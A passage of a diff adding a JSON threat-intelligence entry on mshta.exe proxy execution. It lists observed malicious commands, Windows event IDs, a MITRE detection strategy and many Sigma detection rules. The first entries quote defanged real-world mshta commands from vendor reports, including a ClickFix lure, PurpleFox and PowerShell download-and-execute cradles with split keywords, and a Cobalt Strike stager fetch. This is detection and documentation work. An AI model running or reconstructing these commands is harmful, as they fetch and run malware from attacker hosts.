+        "command": "mshta[.]exe hxxps[://]buck2nd[.]oss-eu-central-1[.]aliyuncs[.]com/dir/sixth/singl6[.]mp4 #  ✅ ''I am not a robot - reCAPTCHA Verification ID: 2165",
+        "intent": "Emmenhtal Loader ClickFix lure: the page copies this command to the clipboard, the victim pastes it in the Run dialog, and explorer.exe launches mshta.exe to fetch a remote HTA.",
+        "status": "verified",
+        "source_name": "Bitdefender MSHTA Legacy Tool Still Powers Malware Campaigns May 2026",
+        "source_url": "https://www.bitdefender.com/en-us/blog/labs/microsofts-mshta-legacy-malware-windows"
+      },
+      {
+        "command": "mshta.exe vbscript:createobject(\"wscript.shell\").run(\"Cmd /c for /d %i in (195[.]189[.]28[.]244:17807 103[.]124[.]106[.]194:18413 58[.]221[.]59[.]20:17256 ) do Msiexec /i hxxp://%i/3EBCE3A4.Png /Q\",0)(window.close)",
+        "intent": "PurpleFox delivery method: launch msiexec from an MSHTA command line to download and execute an MSI package disguised as a .png file.",
+        "status": "verified",
+        "source_name": "Bitdefender MSHTA Legacy Tool Still Powers Malware Campaigns May 2026",
+        "source_url": "https://www.bitdefender.com/en-us/blog/labs/microsofts-mshta-legacy-malware-windows"
+      },
+      {
+        "command": "mshta.exe\" vbscript:close(CreateObject(\"WScript.Shell\").Run(\"powershell $L='(New-Object Net.We';$Y='bClient).Downlo';$V='adString(''hxxp://92[.]255[.]57[.]155/b.jpg'')';$F=I`E`X ($L,$Y,$V -Join '')|I`E`X\",0))",
+        "intent": "MSHTA creates a wscript shell that runs PowerShell to download and execute a script in memory; the URL looks like an image, and the PowerShell keywords are split to bypass detection (IPs typically used by XWorm/Danabot).",
+        "status": "verified",
+        "source_name": "Bitdefender MSHTA Legacy Tool Still Powers Malware Campaigns May 2026",
+        "source_url": "https://www.bitdefender.com/en-us/blog/labs/microsofts-mshta-legacy-malware-windows"
+      },
+      {
+        "command": "mshta.EXE\" vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell Invoke-Expression -Command:(iwr -uri 185[.]156[.]172[.]22/gate990.php -method post -body gieM3iR5).content\"\", 0 : window.close\")",
+        "intent": "Lalala information stealer chain: MSHTA runs PowerShell that fetches the next script from a PHP gate, which serves it only when the POST body contains a predefined password.",
+        "status": "verified",
+        "source_name": "Bitdefender MSHTA Legacy Tool Still Powers Malware Campaigns May 2026",
+        "source_url": "https://www.bitdefender.com/en-us/blog/labs/microsofts-mshta-legacy-malware-windows"
+      },
+      {
+        "command": "mshta.exe http[:]//114.132.246[.]102:1222/bobo.png",
+        "intent": "The attacker ran mshta.exe through cmd.exe from the MS-SQL process; the URL argument made mshta download and execute a malicious HTA that fetches the Cobalt Strike stager XSL script.",
+        "status": "verified",
+        "source_name": "AhnLab ASEC Cobalt Strike Being Distributed to Unsecured MS-SQL Servers (2) February 2022",
+        "source_url": "https://asec.ahnlab.com/en/32062/"
+      }
+    ]
+  },
+  "detections": {
+    "event_ids": {
+      "WinEventLog:Security": [
+        {
+          "event_id": 4688,
+          "data_components": [
+            "Process Creation"
+          ],
+          "techniques": [
+            "T1218.005"
+          ]
+        }
+      ],
+      "WinEventLog:Sysmon": [
+        {
+          "event_id": 3,
+          "data_components": [
+            "Network Connection Creation"
+          ],
+          "techniques": [
+            "T1218.005"
+          ]
+        },
+        {
+          "event_id": 11,
+          "data_components": [
+            "File Creation"
+          ],
+          "techniques": [
+            "T1218.005"
+          ]
+        },
+        {
+          "event_id": 22,
+          "data_components": [
+            "Network Connection Creation"
+          ],
+          "techniques": [
+            "T1218.005"
+          ]
+        }
+      ]
+    },
+    "other_log_sources": [],
+    "attack_detection_strategies": [
+      {
+        "technique": "T1218.005",
+        "id": "DET0506",
+        "name": "Detecting Mshta-based Proxy Execution via Suspicious HTA or Script Invocation",
+        "url": "https://attack.mitre.org/detectionstrategies/DET0506",
+        "analytics": [
+          {
+            "id": "AN1397",
+            "description": "Detection of mshta.exe execution where command-line arguments reference remote or local HTA/script content (VBScript/JScript) followed by subsequent file creation, network retrieval, or process spawning that indicates payload execution outside standard Internet Explorer security context. Correlation includes parent process lineage, command-line inspection, and network connection creation to untrusted or anomalous endpoints.",
+            "log_sources": [
+              {
+                "data_component": "Process Creation",
+                "name": "WinEventLog:Security",
+                "channel": "EventCode=4688"
+              },
+              {
+                "data_component": "Network Connection Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=3, 22"
+              },
+              {
+                "data_component": "File Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=11"
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "sigma_rules": [
+      {
+        "title": "Invoke-Obfuscation Via Use MSHTA",
+        "id": "ac20ae82-8758-4f38-958e-b44a3140ca88",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_via_use_mhsta.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1027",
+          "T1059.001"
+        ]
+      },
+      {
+        "title": "Remotely Hosted HTA File Executed Via Mshta.EXE",
+        "id": "b98d0db6-511d-45de-ad02-e82a98729620",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_mshta_http.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218.005"
+        ]
+      },
+      {
+        "title": "Suspicious JavaScript Execution Via Mshta.EXE",
+        "id": "67f113fa-e23d-4271-befa-30113b3e08b1",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_mshta_javascript.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218.005"
+        ]
+      },
+      {
+        "title": "Potential LethalHTA Technique Execution",
+        "id": "ed5d72a6-f8f4-479d-ba79-02f6a80d7471",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_mshta_lethalhta_technique.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218.005"
+        ]
+      },
+      {
+        "title": "MSHTA Execution with Suspicious File Extensions",
+        "id": "cc7abbd0-762b-41e3-8a26-57ad50d2eea3",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_mshta_susp_execution.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.007",
+          "T1140",
+          "T1218.005"
+        ]
+      },
+      {
+        "title": "Suspicious Mshta.EXE Execution Patterns",
+        "id": "e32f92d1-523e-49c3-9374-bdb13b46a3ba",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_mshta_susp_pattern.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "command_line",
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1106"
+        ]
+      },
+      {
+        "title": "Potential Dropper Script Execution Via WScript/CScript/MSHTA",
+        "id": "cea72823-df4d-4567-950c-0b579eaf0846",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wscript_cscript_mshta_dropper.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.005",
+          "T1059.007"
+        ]
+      },
+      {
+        "title": "Potential Baby Shark Malware Activity",
+        "id": "2b30fa36-3a18-402f-a22d-bf4ce2189f35",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2019/Malware/BabyShark/proc_creation_win_malware_babyshark.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1012",
+          "T1059.001",
+          "T1059.003",
+          "T1218.005"
+        ]
+      },
+      {
+        "title": "Potential Devil Bait Related Indicator",
+        "id": "93d5f1b4-36df-45ed-8680-f66f242b8415",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2021/Malware/Devil-Bait/file_event_win_malware_devil_bait_script_drop.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "file_event"
+        },
+        "attack": []
+      },
+      {
+        "title": "Potential CVE-2023-21554 QueueJumper Exploitation",
+        "id": "53207cc2-0745-4c19-bc72-80be1cc16b3f",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2022/Exploits/CVE-2022-21554/proc_creation_win_exploit_cve_2023_21554_queuejumper.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": []
+      },
+      {
+        "title": "Pikabot Fake DLL Extension Execution Via Rundll32.EXE",
+        "id": "1bf0ba65-9a39-42a2-9271-31d31bf2f0bf",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/Malware/Pikabot/proc_creation_win_malware_pikabot_rundll32_uncommon_extension.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": []
+      },
+      {
+        "title": "Potential Qakbot Rundll32 Execution",
+        "id": "cf879ffb-793a-4753-9a14-bc8f37cc90df",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/Malware/Qakbot/proc_creation_win_malware_qakbot_rundll32_execution.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": []
+      },
+      {
+        "title": "Qakbot Rundll32 Exports Execution",
+        "id": "339ed3d6-5490-46d0-96a7-8abe33078f58",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/Malware/Qakbot/proc_creation_win_malware_qakbot_rundll32_exports.yml",
+        "level": "critical",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": []
+      },
+      {
+        "title": "Qakbot Rundll32 Fake DLL Extension Execution",
+        "id": "bfd34392-c591-4009-b938-9fd985a28b85",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/Malware/Qakbot/proc_creation_win_malware_qakbot_rundll32_fake_dll_execution.yml",
+        "level": "critical",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": []
+      },
+      {
+        "title": "Potential Suspicious Child Process Of 3CXDesktopApp",
+        "id": "63f3605b-979f-48c2-b7cc-7f90523fed88",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/TA/3CX-Supply-Chain/proc_creation_win_malware_3cx_compromise_susp_children.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218"
+        ]
+      },
+      {
+        "title": "PaperCut MF/NG Potential Exploitation",
+        "id": "0934ac71-a331-4e98-a034-d49c491fbbcb",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/TA/PaperCut-Print-Management-Exploitation/proc_creation_win_papercut_print_management_exploitation_pc_app.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Potential Exploitation of GoAnywhere MFT Vulnerability",
+        "id": "6c76b3d0-afe4-4870-9443-ffe6773c5fef",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2025/Exploits/CVE-2025-10035/proc_creation_win_exploit_cve_2025_10035.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001",
+          "T1133",
+          "T1190"
+        ]
+      },
+      {
+        "title": "Suspicious CrushFTP Child Process",
+        "id": "459628e3-1b00-4e9b-9e5b-7da8961aea35",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2025/Exploits/CVE-2025-31161/proc_creation_win_crushftp_susp_child_processes.yml",
+        "level": "medium",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001",
+          "T1059.003",
+          "T1190"
+        ]
+      },
+      {
+        "title": "Suspicious Child Process of SAP NetWeaver",
+        "id": "5b304bcb-ac33-49d0-87af-fa1b3ca94333",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2025/Exploits/CVE-2025-31324/proc_creation_win_sap_netweaver_susp_child_process.yml",
+        "level": "medium",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.003",
+          "T1190"
+        ]
+      },
+      {
+        "title": "Suspicious Child Process of SolarWinds WebHelpDesk",
+        "id": "8c7f4a2d-3b9e-4f1c-9a6d-2e8f5c3d9a1b",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2025/Exploits/CVE-2025-40551/proc_creation_win_exploit_cve_2025_40551.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1190"
+        ]
+      },
+      {
+        "title": "Potential Exploitation of CrushFTP RCE Vulnerability (CVE-2025-54309)",
+        "id": "0fdc7c7f-c690-4217-9ae3-31f5156eed72",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2025/Exploits/CVE-2025-54309/proc_creation_win_exploit_cve_2025_54309.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001",
+          "T1059.003",
+          "T1068",
+          "T1190"
+        ]
+      },
+      {
+        "title": "Windows Suspicious Child Process from Node.js - React2Shell",
+        "id": "271de298-cc0e-4842-acd8-079a0a99ea65",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2025/Exploits/CVE-2025-55182/proc_creation_win_exploit_cve_2025_55182_susp_nodejs_server_child_process.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line",
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059",
+          "T1190"
+        ]
+      },
+      {
+        "title": "Dbghelp/Dbgcore DLL Loaded By Uncommon/Suspicious Process",
+        "id": "0e277796-5f23-4e49-a490-483131d4f6e1",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/image_load/image_load_dll_dbghelp_dbgcore_susp_load.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "image_load",
+          "product": "windows"
+        },
+        "attack": [
+          "T1003.001"
+        ]
+      },
+      {
+        "title": "Potentially Suspicious PowerShell Child Processes",
+        "id": "e4b6d2a7-d8a4-4f19-acbd-943c16d90647",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_susp_child_processes.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001"
+        ]
+      },
+      {
+        "title": "Manual Execution of Script Inside of a Compressed File",
+        "id": "95724fc1-a258-4674-97db-a30351981c5a",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_susp_script_exec_from_compressed_parent.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059"
+        ]
+      },
+      {
+        "title": "Potentially Suspicious DMP/HDMP File Creation",
+        "id": "aba15bdd-657f-422a-bab3-ac2d2a0d6f1c",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_dump_file_susp_creation.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "file_event",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Potential Initial Access via DLL Search Order Hijacking",
+        "id": "dbbd9f66-2ed3-4ca2-98a4-6ea985dd1a1c",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_initial_access_dll_search_order_hijacking.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "file_event"
+        },
+        "attack": [
+          "T1566",
+          "T1566.001",
+          "T1574",
+          "T1574.001"
+        ]
+      },
+      {
+        "title": "NTDS.DIT Creation By Uncommon Process",
+        "id": "11b1ed55-154d-4e82-8ad7-83739298f720",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_ntds_dit_uncommon_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "file_event"
+        },
+        "attack": [
+          "T1003.002",
+          "T1003.003"
+        ]
+      },
+      {
+        "title": "Office Macro File Creation From Suspicious Process",
+        "id": "b1c50487-1967-4315-a026-6491686d860e",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_office_macro_files_from_susp_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "file_event",
+          "product": "windows"
+        },
+        "attack": [
+          "T1566.001"
+        ]
+      },
+      {
+        "title": "Windows Shell/Scripting Application File Write to Suspicious Folder",
+        "id": "1277f594-a7d1-4f28-a2d3-73af5cbeab43",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_shell_write_susp_directory.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "file_event",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059"
+        ]
+      },
+      {
+        "title": "Legitimate Application Dropped Archive",
+        "id": "654fcc6d-840d-4844-9b07-2c3300e54a26",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_susp_legitimate_app_dropping_archive.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "file_event"
+        },
+        "attack": [
+          "T1218"
+        ]
+      },
+      {
+        "title": "Legitimate Application Dropped Executable",
+        "id": "f0540f7e-2db3-4432-b9e0-3965486744bc",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_susp_legitimate_app_dropping_exe.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "file_event"
+        },
+        "attack": [
+          "T1218"
+        ]
+      },
+      {
+        "title": "Legitimate Application Writing Files In Uncommon Location",
+        "id": "1cf465a1-2609-4c15-9b66-c32dbe4bfd67",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_susp_legitimate_app_dropping_in_uncommon_location.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "file_event"
+        },
+        "attack": [
+          "T1105",
+          "T1218"
+        ]
+      },
+      {
+        "title": "Legitimate Application Dropped Script",
+        "id": "7d604714-e071-49ff-8726-edeb95a70679",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_susp_legitimate_app_dropping_script.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "file_event"
+        },
+        "attack": [
+          "T1218"
+        ]
+      },
+      {
+        "title": "Windows Terminal Profile Settings Modification By Uncommon Process",
+        "id": "9b64de98-9db3-4033-bd7a-f51430105f00",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_susp_windows_terminal_profile.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "file_event"
+        },
+        "attack": [
+          "T1547.015"
+        ]
+      },
+      {
+        "title": "DotNet CLR DLL Loaded By Scripting Applications",
+        "id": "4508a70e-97ef-4300-b62b-ff27992990ea",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/image_load/image_load_susp_script_dotnet_clr_dll_load.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "image_load",
+          "product": "windows"
+        },
+        "attack": [
+          "T1055"
+        ]
+      },
+      {
+        "title": "Suspicious ArcSOC.exe Child Process",
+        "id": "8e95e73e-ba02-4a87-b4d7-0929b8053038",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_arcsoc_susp_child_process.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059",
+          "T1203"
+        ]
+      },
+      {
+        "title": "Suspicious BitLocker Access Agent Update Utility Execution",
+        "id": "9f38c1db-e2ae-40bf-81d0-5b68f73fb512",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_baaupdate_susp_child_process.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1021.003",
+          "T1218"
+        ]
+      },
+      {
+        "title": "Suspicious Child Process Of BgInfo.EXE",
+        "id": "811f459f-9231-45d4-959a-0266c6311987",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_bginfo_suspicious_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.005",
+          "T1202",
+          "T1218"
+        ]
+      },
+      {
+        "title": "Suspicious Chromium Browser Instance Executed With Custom Extension",
+        "id": "27ba3207-dd30-4812-abbf-5d20c57d474e",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_browsers_chromium_susp_load_extension.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1176.001"
+        ]
+      },
+      {
+        "title": "Sticky Key Like Backdoor Execution",
+        "id": "2fdefcb3-dbda-401e-ae23-f0db027628bc",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_cmd_sticky_key_like_backdoor_execution.yml",
+        "level": "critical",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1546.008"
+        ]
+      },
+      {
+        "title": "Potentially Suspicious Child Processes Spawned by ConHost",
+        "id": "dfa03a09-8b92-4d83-8e74-f72839b1c407",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_conhost_susp_winshell_child_process.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1202",
+          "T1218"
+        ]
+      },
+      {
+        "title": "Csc.EXE Execution Form Potentially Suspicious Parent",
+        "id": "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_csc_susp_parent.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1027.004",
+          "T1059.005",
+          "T1059.007",
+          "T1218.005"
+        ]
+      },
+      {
+        "title": "Potentially Suspicious Child Process Of ClickOnce Application",
+        "id": "67bc0e75-c0a9-4cfc-8754-84a505b63c04",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_dfsvc_suspicious_child_processes.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Potentially Suspicious Child Process Of DiskShadow.EXE",
+        "id": "9f546b25-5f12-4c8d-8532-5893dcb1e4b8",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_diskshadow_child_process_susp.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218"
+        ]
+      },
+      {
